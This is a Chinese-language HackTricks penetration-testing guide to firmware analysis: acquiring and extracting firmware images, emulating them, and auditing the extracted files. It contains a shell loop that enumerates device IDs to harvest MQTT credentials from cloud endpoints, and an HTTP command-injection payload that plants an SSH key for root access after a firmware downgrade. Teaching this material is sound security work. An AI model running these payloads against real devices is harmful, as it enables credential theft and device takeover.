# 固件分析

{{#include ../../banners/hacktricks-training.md}}

## **介绍**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是使设备正常运行的关键软件，通过管理和促进硬件组件与用户交互的软件之间的通信来工作。它存储在永久性存储器中，确保设备从上电那一刻起就能访问重要指令，从而启动操作系统。检查并（在必要时）修改固件是识别安全漏洞的重要步骤。

## **信息收集**

**信息收集**是理解设备构成和所用技术的关键初始步骤。该过程涉及收集以下方面的数据：

- 设备运行的 CPU 架构和操作系统
- 引导加载程序（bootloader）细节
- 硬件布局与数据手册
- 代码库指标和源代码位置
- 外部库及其许可证类型
- 更新历史和监管认证
- 架构和流程图
- 安全评估及已识别的漏洞

为此，**开源情报 (OSINT)** 工具非常有价值，同时对任何可用开源软件组件进行手动和自动化审查也很重要。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供可用于发现潜在问题的免费静态分析。

## **获取固件**

获取固件可以通过多种方式进行，不同方法的复杂度各异：

- **Directly** from the source (developers, manufacturers)
- **Building** it from provided instructions
- **Downloading** from official support sites
- 利用 **Google dork** 查询查找托管的固件文件
- 直接访问 **云存储**，使用类似 [S3Scanner](https://github.com/sa7mon/S3Scanner) 的工具
- 通过 **man-in-the-middle techniques** 截获更新
- 通过 **UART**, **JTAG**, 或 **PICit** 等连接从设备中**提取**
- 在设备通信中**嗅探**更新请求
- 识别并使用 **硬编码的更新端点**
- 从 bootloader 或网络中**转储**
- 在其他方法都失败时，使用合适的硬件工具**拆下并读取**存储芯片

## 分析固件

既然你已经**获取到固件**，你需要从中提取信息以决定如何处理。可以使用的不同工具有：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果用那些工具找不到太多内容，使用 `binwalk -E <bin>` 检查镜像的 **entropy**；如果 entropy 较低，通常不太可能被加密。若 entropy 较高，则很可能被加密（或以某种方式压缩）。

此外，你可以使用这些工具来提取固件中嵌入的 **文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）来检查文件。

### 获取文件系统

使用前面提到的工具，例如 `binwalk -ev <bin>`，你应该能够 **提取文件系统**。\
Binwalk 通常会将其提取到一个 **以文件系统类型命名的文件夹** 中，通常为下列之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### 手动文件系统提取

有时，binwalk 的签名中**不会包含文件系统的 magic byte**。在这种情况下，使用 binwalk **查找文件系统的偏移量并 carve 压缩的文件系统** 从二进制中切出，并根据其类型 **手动提取** 文件系统，按照下面的步骤操作。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd command** 提取 Squashfs 文件系统。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

解压后文件会位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析固件

一旦获得固件，就需要对其进行拆解以了解其结构和潜在漏洞。这个过程涉及使用各种工具来分析并从固件镜像中提取有价值的数据。

### 初步分析工具

下面给出一组用于初步检查二进制文件（记作 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据以及了解分区和文件系统的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，使用 `binwalk -E <bin>` 检查 **熵**。低熵表明可能未加密，而高熵则可能表示已加密或压缩。

要提取 **嵌入文件**，建议使用像 **file-data-carving-recovery-tools** 文档和 **binvis.io** 这样的工具与资源进行文件检查。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，通常会解压到以文件系统类型命名的目录中（例如 squashfs、ubifs）。然而，当 **binwalk** 因缺少 magic bytes 无法识别文件系统类型时，就需要手动提取。过程包括使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令提取出文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
随后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取其内容。

### 文件系统分析

在提取出文件系统后，开始搜索安全缺陷。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本以及用于离线分析的已编译二进制文件。

**关键位置** 和 **项目** 可包括：

- **etc/shadow** 和 **etc/passwd**（用于用户凭据）
- **etc/ssl** 中的 SSL 证书和密钥
- 配置和脚本文件中可能存在的漏洞
- 可供进一步分析的嵌入式二进制文件
- 常见的 IoT 设备 web 服务器和二进制文件

若干工具可帮助在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于敏感信息搜索
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于静态和动态分析

### 已编译二进制的安全检查

文件系统中发现的源代码和已编译二进制都必须仔细检查是否存在漏洞。像用于 Unix 二进制的 **checksec.sh** 和用于 Windows 二进制的 **PESecurity** 这类工具可以帮助识别可能被利用的未受保护二进制。

## 通过派生的 URL 令牌获取云配置和 MQTT 凭据

许多 IoT hub 从如下形式的云端点获取每台设备的配置：

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 是在本地由 deviceId 使用硬编码的密钥派生的，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都能重建该 URL 并拉取云配置，通常会暴露明文 MQTT 凭据和主题前缀。

实际流程：

1) 从 UART 启动日志中提取 deviceId

- 连接一个 3.3V UART 适配器 (TX/RX/GND) 并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL pattern 和 broker address 的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制加载到 Ghidra/radare2 中并搜索配置路径 ("/pf/") 或 MD5 的使用。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token 并将摘要转为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集云配置和 MQTT 凭证

- 组成 URL 并用 curl 拉取 JSON；用 jq 解析以提取 secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用明文 MQTT 和弱的主题 ACLs（如果存在）

- 使用恢复的凭证订阅维护主题并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（大规模、经授权）

- 许多生态系统将厂商 OUI/product/type 字节嵌入其中，后面跟着顺序后缀。
- 你可以以编程方式遍历候选 ID、推导 tokens 并获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 在尝试 mass enumeration 之前，始终获得明确授权。
- 在可能的情况下，优先使用 emulation 或 static analysis 在不修改目标硬件的情况下恢复 secrets。

对固件进行 emulation 的过程可以对设备的运行或单个程序进行 **dynamic analysis**。这种方法可能会因为硬件或 architecture 的依赖而遇到挑战，但将 root filesystem 或特定 binaries 转移到具有匹配 architecture 和 endianness 的设备（例如 Raspberry Pi）或预构建的 virtual machine 上，可以便于进一步测试。

### 仿真单个 binaries

要检查单个程序，确定程序的 endianness 和 CPU architecture 至关重要。

#### 以 MIPS Architecture 为例

要 emulate 一个 MIPS architecture 的 binary，可使用以下命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装所需的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

对于 ARM 二进制，过程类似，使用 `qemu-arm` 进行仿真。

### Full System Emulation

像 [Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具，支持完整的固件仿真，自动化该过程并辅助动态分析。

## Dynamic Analysis in Practice

此阶段使用真实设备或仿真设备环境进行分析。保持对操作系统和文件系统的 shell 访问非常重要。仿真可能无法完美模拟硬件交互，可能需要不时重启仿真。分析应反复检查文件系统，利用暴露的网页和网络服务，并检查 bootloader 漏洞。固件完整性测试对识别潜在后门非常关键。

## Runtime Analysis Techniques

运行时分析涉及在进程或二进制的运行环境中进行交互，使用诸如 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 等技术识别漏洞。

## Binary Exploitation and Proof-of-Concept

为已识别的漏洞开发 PoC 需要对目标架构有深入理解，并使用低级语言进行编程。嵌入式系统中二进制运行时防护较少见，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等技术。

## Prepared Operating Systems for Firmware Analysis

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的操作系统提供了用于固件安全测试的预配置环境，并配备所需工具。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个发行版，旨在帮助你对 Internet of Things (IoT) 设备进行安全评估和 penetration testing。它通过提供预配置并加载所有必要工具的环境，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即便厂商对固件镜像实现了加密签名校验，**版本回滚（降级）保护经常被忽略**。当 boot- or recovery-loader 只使用嵌入的公钥验证签名，但不对正在刷写的镜像的*版本*（或单调计数器）进行比较时，攻击者就可以合法地安装一个仍具有有效签名的**旧版、存在漏洞的固件**，从而重新引入已修补的漏洞。

典型攻击流程：

1. **获取较旧的已签名镜像**
   * 从厂商的公共下载门户、CDN 或支持网站获取。
   * 从配套的手机/桌面应用中提取（例如在 Android APK 的 `assets/firmware/` 内）。
   * 从第三方仓库检索，例如 VirusTotal、互联网档案、论坛等。
2. **通过任何暴露的更新通道将镜像上传或提供给设备**
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * 许多消费类 IoT 设备暴露 *unauthenticated* 的 HTTP(S) 接口，这些接口接受 Base64 编码的固件 blob，在服务器端解码并触发恢复/升级。
3. 降级后，利用在较新版本中已被修补的漏洞（例如后来添加的命令注入过滤器）。
4. 可选地在获得持久性后刷回最新镜像或禁用更新以避免被发现。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在易受攻击（已降级）的固件中，`md5` 参数未经过任何清理，直接拼接到 shell 命令中，允许注入任意命令（此处示例为启用基于 SSH 密钥的 root 访问）。后续固件版本引入了基本的字符过滤，但由于缺乏降级保护，这一修复无效。

### 从移动应用提取固件

许多厂商会把完整的固件镜像捆绑在配套的移动应用内，以便通过蓝牙/Wi‑Fi 由应用更新设备。这些包通常以未加密的形式存放在 APK/APEX 中的路径下，例如 `assets/fw/` 或 `res/raw/`。像 `apktool`、`ghidra`，甚至直接用 `unzip` 都可以在不触碰物理硬件的情况下提取已签名的镜像。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 评估更新逻辑的核对清单

* 传输/认证用于 *update endpoint* 的机制是否得到充分保护（TLS + authentication）？
* 设备在刷写之前是否对 **version numbers** 或 **monotonic anti-rollback counter** 进行比较？
* 镜像是否在安全启动链内被验证（例如签名由 ROM code 检查）？
* userland code 是否执行额外的 sanity checks（例如 allowed partition map、model number）？
* *partial* 或 *backup* 的更新流程是否重用相同的验证逻辑？

> 💡  如果上述任何项缺失，平台很可能容易受到 rollback attacks。

## 用于练习的易受攻击固件

要练习在固件中发现漏洞，可以从以下易受攻击的固件项目开始。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
